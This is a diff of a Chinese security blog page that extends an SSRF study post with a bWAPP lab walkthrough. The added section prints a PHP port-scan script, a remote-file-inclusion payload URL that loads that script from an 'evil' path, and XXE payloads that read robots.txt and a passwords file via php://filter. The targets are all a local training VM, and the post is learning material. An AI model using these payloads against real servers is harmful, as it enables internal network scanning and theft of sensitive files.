@@ -150,10 +150,18 @@
 <meta property="og:site_name" content="Miracle778&#39;s Blog">
 <meta property="og:description" content="SSRF漏洞学习  关于SSRF的一些学习笔记，会介绍SSRF的利用原理及两个bWapp中关于SSRF的案例">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-03-27T13:06:23.606Z">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//SSRF学习//1.PNG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//SSRF学习//2.PNG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//SSRF学习//3.PNG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//SSRF学习//4.PNG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//SSRF学习//5.PNG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//SSRF学习//6.PNG">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//SSRF学习//7.PNG">
+<meta property="og:updated_time" content="2019-03-29T05:56:29.952Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSRF学习">
 <meta name="twitter:description" content="SSRF漏洞学习  关于SSRF的一些学习笔记，会介绍SSRF的利用原理及两个bWapp中关于SSRF的案例">
+<meta name="twitter:image" content="http://miracle778.github.io/Web安全/SSRF//SSRF学习//1.PNG">
 
 
 
@@ -445,12 +453,24 @@
                 
               
 
-              <time title="创建时间：2019-03-27 19:52:10 / 修改时间：21:06:23" itemprop="dateCreated datePublished" datetime="2019-03-27T19:52:10+08:00">2019-03-27</time>
+              <time title="创建时间：2019-03-27 19:52:10" itemprop="dateCreated datePublished" datetime="2019-03-27T19:52:10+08:00">2019-03-27</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-29 13:56:29" itemprop="dateModified" datetime="2019-03-29T13:56:29+08:00">2019-03-29</time>
               
             
           </span>
@@ -523,7 +543,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">997</span>
+                <span title="本文字数">3.8k</span>
               
 
               
@@ -537,7 +557,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">1 分钟</span>
+                <span title="阅读时长">3 分钟</span>
               
             </div>
           
@@ -606,8 +626,28 @@ domain
 <li>因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</li>
 <li>在页面源码中查找访问的资源地址,如果资源地址类型为www&#46;hdu&#46;edu&#46;cn/xxx.php?image=\<url>的话，则有可能出现SSRF漏洞</url></li>
 </ol>
-<h2 id="SSRF实例-——-bWapp中的SSRF"><a href="#SSRF实例-——-bWapp中的SSRF" class="headerlink" title="SSRF实例 —— bWapp中的SSRF"></a>SSRF实例 —— bWapp中的SSRF</h2><p>明天再更吧…</p>
 <hr>
+<h2 id="SSRF实例-——-bWapp中的SSRF"><a href="#SSRF实例-——-bWapp中的SSRF" class="headerlink" title="SSRF实例 —— bWapp中的SSRF"></a>SSRF实例 —— bWapp中的SSRF</h2><h3 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h3><p>选择bWapp中的SSRF环境，可以看到有三个任务，第三个因为没有实验环境，所以就做两个。<br><img src="/Web安全/SSRF/\SSRF学习\\1.PNG" alt></p>
+<h3 id="0x01-利用RFI进行端口扫描"><a href="#0x01-利用RFI进行端口扫描" class="headerlink" title="0x01 利用RFI进行端口扫描"></a>0x01 利用RFI进行端口扫描</h3><h4 id="点击-Port-scan，获取一个利用脚本"><a href="#点击-Port-scan，获取一个利用脚本" class="headerlink" title="点击 Port scan，获取一个利用脚本"></a>点击 Port scan，获取一个利用脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert(\"U 4r3 0wn3d by MME!!!\");&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//list of port numbers to scan</span></span><br><span class="line">    $ports = <span class="keyword">array</span>(<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">110</span>, <span class="number">1433</span>, <span class="number">3306</span>);</span><br><span class="line">    </span><br><span class="line">    $results = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span>($ports <span class="keyword">as</span> $port)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($pf = @fsockopen($_REQUEST[<span class="string">"ip"</span>], $port, $err, $err_string, <span class="number">1</span>))</span><br><span class="line">        <span class="comment">//创建一个套接字连接到指定IP，成功返回句柄，失败false</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">true</span>;</span><br><span class="line">            fclose($pf);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">false</span>;        </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">foreach</span>($results <span class="keyword">as</span> $port=&gt;$val)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $prot = getservbyport($port,<span class="string">"tcp"</span>);    <span class="comment">//返回端口对应协议</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Port $port ($prot): "</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($val)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:green\"&gt;OK&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:red\"&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h4><p>相应重要注释我已经在上面代码中写出，这里就简单写写。</p>
+<ol>
+<li>首先看到<code>if(isset($_REQUEST[&quot;ip&quot;]))</code>，先要提交传递IP参数才能激活脚本。</li>
+<li>然后是两个foreach循环，第一个循环是标记出目标IP 21, 22, 23, 25, 53, 80, 110, 1433, 3306这些常用端口的开放情况，开放即为true、关闭为false。第二个循环是将上一个循环判断得出的端口开放情况并加上端口对应的服务协议输出。</li>
+</ol>
+<h4 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h4><ol>
+<li>将bWapp的漏洞环境切换为RFI/LFI<br><img src="/Web安全/SSRF/\SSRF学习\\2.PNG" alt></li>
+<li>可以看到有个选择语言的按钮，点击后观察到页面的url变化为<code>http://192.168.164.131/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</code>,其中language参数此处存在远程文件包含漏洞，也就是说可以通过此处调用恶意脚本。<br><img src="/Web安全/SSRF/\SSRF学习\\3.PNG" alt></li>
+<li>脚本的url地址是<code>http://192.168.164.131/evil/ssrf-1.txt</code>,将url复制下来，构造payload<blockquote>
+<p>POST: <a href="http://192.168.164.131/bWAPP/rlfi.php?language=http://192.168.164.131/evil/ssrf-1.txt&amp;action=go" target="_blank" rel="noopener">http://192.168.164.131/bWAPP/rlfi.php?language=http://192.168.164.131/evil/ssrf-1.txt&amp;action=go</a><br>POST Data: ip=xx.xx.xx.xx</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="/Web安全/SSRF/\SSRF学习\\4.PNG" alt></p>
+<h3 id="0x02-利用XXE获取敏感文件中的内容"><a href="#0x02-利用XXE获取敏感文件中的内容" class="headerlink" title="0x02 利用XXE获取敏感文件中的内容"></a>0x02 利用XXE获取敏感文件中的内容</h3><h4 id="点击-Access-获取脚本"><a href="#点击-Access-获取脚本" class="headerlink" title="点击 Access 获取脚本"></a>点击 Access 获取脚本</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Accesses a file on the internal network (1)</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>&amp;bWAPP;<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>blah<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Accesses a file on the internal network (2)</span><br><span class="line"># Web pages returns some characters that break the XML schema &gt; use the PHP base64 encoder filter to return an XML schema friendly version of the page!</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY bWAPP SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>&amp;bWAPP;<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>blah<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="利用脚本-1"><a href="#利用脚本-1" class="headerlink" title="利用脚本"></a>利用脚本</h4><p>此处是利用bWapp中的XXE环境进行实验，关于bWapp中XXE的实验我之前已经<a href="https://miracle778.github.io/Web%E5%AE%89%E5%85%A8/XXE/XXE%E5%AD%A6%E4%B9%A0.html#more">写过了</a>这里就不多说了。<br>区别就是将payload分别换成此处脚本中的。</p>
+<h5 id="获取robots-txt文件"><a href="#获取robots-txt文件" class="headerlink" title="获取robots.txt文件"></a>获取robots.txt文件</h5><p><img src="/Web安全/SSRF/\SSRF学习\\5.PNG" alt></p>
+<h5 id="获取heroes-html源码"><a href="#获取heroes-html源码" class="headerlink" title="获取heroes.html源码"></a>获取heroes.html源码</h5><p><img src="/Web安全/SSRF/\SSRF学习\\6.PNG" alt><br><img src="/Web安全/SSRF/\SSRF学习\\7.PNG" alt></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SSRF就到这里了。现在都在更些基础的东西，希望日后能多写点更深层次的。</p>
 
       
     </div>
@@ -922,7 +962,7 @@ domain
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF是什么"><span class="nav-number">2.</span> <span class="nav-text">SSRF是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF形成原因"><span class="nav-number">3.</span> <span class="nav-text">SSRF形成原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF的用途"><span class="nav-number">4.</span> <span class="nav-text">SSRF的用途</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF漏洞常见出现位置"><span class="nav-number">5.</span> <span class="nav-text">SSRF漏洞常见出现位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF漏洞的简单判断方法"><span class="nav-number">6.</span> <span class="nav-text">SSRF漏洞的简单判断方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF实例-——-bWapp中的SSRF"><span class="nav-number">7.</span> <span class="nav-text">SSRF实例 —— bWapp中的SSRF</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF是什么"><span class="nav-number">2.</span> <span class="nav-text">SSRF是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF形成原因"><span class="nav-number">3.</span> <span class="nav-text">SSRF形成原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF的用途"><span class="nav-number">4.</span> <span class="nav-text">SSRF的用途</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF漏洞常见出现位置"><span class="nav-number">5.</span> <span class="nav-text">SSRF漏洞常见出现位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF漏洞的简单判断方法"><span class="nav-number">6.</span> <span class="nav-text">SSRF漏洞的简单判断方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF实例-——-bWapp中的SSRF"><span class="nav-number">7.</span> <span class="nav-text">SSRF实例 —— bWapp中的SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#任务列表"><span class="nav-number">7.1.</span> <span class="nav-text">任务列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-利用RFI进行端口扫描"><span class="nav-number">7.2.</span> <span class="nav-text">0x01 利用RFI进行端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#点击-Port-scan，获取一个利用脚本"><span class="nav-number">7.2.1.</span> <span class="nav-text">点击 Port scan，获取一个利用脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析代码"><span class="nav-number">7.2.2.</span> <span class="nav-text">分析代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用脚本"><span class="nav-number">7.2.3.</span> <span class="nav-text">利用脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-利用XXE获取敏感文件中的内容"><span class="nav-number">7.3.</span> <span class="nav-text">0x02 利用XXE获取敏感文件中的内容</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#点击-Access-获取脚本"><span class="nav-number">7.3.1.</span> <span class="nav-text">点击 Access 获取脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用脚本-1"><span class="nav-number">7.3.2.</span> <span class="nav-text">利用脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#获取robots-txt文件"><span class="nav-number">7.3.2.1.</span> <span class="nav-text">获取robots.txt文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取heroes-html源码"><span class="nav-number">7.3.2.2.</span> <span class="nav-text">获取heroes.html源码</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">8.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
@@ -964,7 +1004,7 @@ domain
     
       <span class="post-meta-item-text">站点总字数：</span>
     
-    <span title="站点总字数">30k</span>
+    <span title="站点总字数">33k</span>
   
 
   
@@ -975,7 +1015,7 @@ domain
     
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
     
-    <span title="站点阅读时长">27 分钟</span>
+    <span title="站点阅读时长">30 分钟</span>
   
 </div>
 
